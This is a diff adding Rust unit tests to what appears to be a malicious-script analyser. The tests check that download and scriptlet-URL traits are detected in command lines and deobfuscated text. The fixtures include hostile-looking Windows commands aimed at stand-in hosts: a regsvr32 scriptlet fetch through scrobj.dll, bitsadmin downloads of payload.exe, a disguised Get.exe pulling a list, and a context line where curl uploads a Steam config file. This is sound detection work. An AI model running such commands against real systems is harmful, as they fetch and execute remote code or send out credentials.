@@ -6607,6 +6607,29 @@ mod wget_tests {
     }
 
     #[test]
+    fn get_exe_wget_style_attached_input_list_records_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"get.exe -nc -ihttp://get-input.example/list.txt -P C:\ProgramData\WindowsComSvc"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![("http://get-input.example/list.txt", None)],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn wget_short_option_cluster_records_download() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -13863,6 +13886,30 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn regsvr32_equals_bound_scriptlet_url_in_deob_text_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "https://regsvr32-equals-deob.example/payload.sct";
+        let line = format!(r#"regsvr32 /s /n /u /i={url} scrobj.dll"#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { url: got, .. } if got == url
+            )),
+            "equals-bound regsvr32 scriptlet URL not typed in deob text: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "equals-bound regsvr32 scriptlet URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn regsvr32_schemeless_scriptlet_url_in_deob_text_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -13905,6 +13952,25 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
         assert!(
             has,
             "direct regsvr32 scriptlet URL not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_equals_bound_scriptlet_url_argument_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::interp::interpret_line(
+            "regsvr32 /s /n /u /i=https://regsvr32-equals.example/payload.sct scrobj.dll",
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "https://regsvr32-equals.example/payload.sct"
+            )),
+            "equals-bound regsvr32 scriptlet URL not typed: {:?}",
             env.traits
         );
     }
@@ -14380,6 +14446,26 @@ curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\
     }
 
     #[test]
+    fn bitsadmin_attached_transfer_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"bitsadmin /transfer:job1 /download /priority:foreground "https://bits-attached-transfer.example/payload.exe" "C:\Temp\payload.exe""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "https://bits-attached-transfer.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )),
+            "no structured attached bitsadmin transfer download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn bitsadmin_addfile_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -14405,6 +14491,26 @@ curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\
         assert_eq!(
             generic_count, 0,
             "bitsadmin addfile URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn bitsadmin_attached_addfile_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"bitsadmin /addfile:job1 "https://bits-attached-addfile.example/payload.exe" "C:\Temp\payload.exe""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "https://bits-attached-addfile.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )),
+            "no structured attached bitsadmin addfile download: {:?}",
             env.traits
         );
     }
@@ -17564,6 +17670,39 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
         assert_eq!(
             generic_count, 0,
             "Get.exe URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn get_exe_wget_style_attached_input_file_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"C:\ProgramData\WindowsComSvc\Get.exe -nc --input-file=http://get-input-deob.example/list.txt -P C:\ProgramData\WindowsComSvc"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://get-input-deob.example/list.txt"
+                        && dst.as_deref() == Some("C:\\ProgramData\\WindowsComSvc\\list.txt")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from attached Get.exe input-file: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("get-input-deob.example/list.txt"))
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "attached Get.exe input-file URL double-emitted: {:?}",
             env.traits
         );
     }
